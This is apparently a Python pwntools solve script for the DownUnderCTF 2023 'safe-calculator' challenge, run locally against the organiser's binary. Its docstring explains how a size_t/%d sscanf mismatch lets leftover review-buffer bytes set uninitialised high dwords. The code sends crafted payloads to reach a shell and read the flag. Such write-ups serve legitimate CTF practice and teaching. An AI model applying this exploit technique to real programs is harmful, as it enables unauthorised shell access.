#!/usr/bin/env python3
"""Solve DownUnderCTF 2023 `safe-calculator` -- uninitialised stack reuse.

Recon: three functions matter.
  * `leave_review()` reads up to 48 printable bytes into `char buf[0x30]`.
  * `calculate()` declares two `size_t` locals and fills them with
    `sscanf("{ arg1: %d, arg2: %d}", &arg1, &arg2)`.  `%d` writes only the
    LOW 32 bits of each 8-byte local; the HIGH 32 bits keep whatever was on
    the stack before.
  * `win()` runs `system("/bin/sh")`, reached when
    `arg1 + arg2 == 13370166083584009001`.

Clue: `size_t` + `%d` is the bug.  `calculate()` and `leave_review()` sit at
the same call depth, so their frames overlap.  Bytes we leave in the review
buffer survive as the uninitialised high dwords of `arg1`/`arg2`.  Picking the
right printable bytes makes the 64-bit sum hit the magic constant -- no
pointer leak, no brute force.

Two reviews are used: the second (shorter) write leaves the last dword of the
first review in place, so the two high dwords land on the values we need.

Runs entirely LOCALLY against the organiser-shipped `publish/safe-calculator`
with our own flag.txt; the popped shell just `cat`s it.

Fetch first:  python challenges/fetch.py safe-calculator
"""
import os
import shutil

from pwn import context, process

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", ".."))
CHALL = os.path.join(REPO, "challenges", "safe-calculator")
context.log_level = "error"


def main() -> None:
    binary = os.path.join(CHALL, "publish", "safe-calculator")
    os.chmod(binary, 0o755)
    # The retired challenge ships the real flag under src/flag.txt; drop it
    # next to the binary so the popped shell has something to read.
    flag_src = os.path.join(CHALL, "src", "flag.txt")
    run_dir = os.path.join(CHALL, "publish")
    shutil.copyfile(flag_src, os.path.join(run_dir, "flag.txt"))

    proc = process(binary, cwd=run_dir)
    for review in (b"A" * 36 + b"X" * 8 + b"A.ZX", b"A" * 36 + b"712aXXXX"):
        proc.sendlineafter(b">", b"2")
        proc.sendlineafter(b"review! : ", review)
    proc.sendlineafter(b">", b"1")  # trigger calculate() -> win()
    proc.sendline(b"cat flag.txt")
    out = proc.recvrepeat(1.0).decode(errors="replace")
    proc.close()

    i = out.find("DUCTF{")
    if i != -1:
        print("FLAG:", out[i:out.find("}", i) + 1])
    else:
        print("flag not found; output:", out[:160])


if __name__ == "__main__":
    main()
